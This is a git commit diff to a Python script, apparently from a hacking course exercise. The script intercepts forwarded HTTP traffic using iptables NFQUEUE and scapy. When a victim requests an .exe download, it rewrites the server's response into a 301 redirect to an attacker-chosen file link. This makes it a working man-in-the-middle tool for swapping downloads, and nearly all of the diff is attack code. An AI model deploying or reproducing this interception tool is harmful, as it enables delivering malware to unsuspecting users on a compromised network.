bc21397f0247e0a74f91100a7190f8f9d51c425e
root <gvrosun@gmail.com>
2020-07-11 07:19:19 -0400

    replace_downloads module fully implemented!!!

--- replace_downloads.py
+++ replace_downloads.py
@@ -6,24 +6,34 @@ import subprocess
 ack_list = []
 
 
+def set_load(packet, load):
+    print("[+] Replacing download file...")
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:  # http means 80
-            print("HTTP Request")
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP Response")
             if scapy_packet[scapy.TCP].seq in ack_list:
-                print("[+] Replacing download file...")
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + website + "\n\n")
+                packet.set_payload(str(modified_packet))
     packet.accept()
 
 
+website = raw_input("Enter the link of file: ")
 subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
 try:
-    # print("[+] DNS Spoof started on " + website + " --> " + target_web_ip)
+    print("[+] Replace download started on " + website)
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
